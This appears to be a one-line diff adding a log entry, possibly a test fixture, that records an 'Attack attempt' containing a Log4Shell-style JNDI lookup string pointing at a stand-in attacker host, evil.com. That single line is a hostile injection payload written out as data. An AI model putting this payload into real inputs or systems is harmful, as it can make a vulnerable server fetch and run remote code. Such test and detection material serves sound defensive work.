@@ -1,0 +1,1 @@
+2024-05-01 INFO - Attack attempt ${jndi:ldap://evil.com/a}
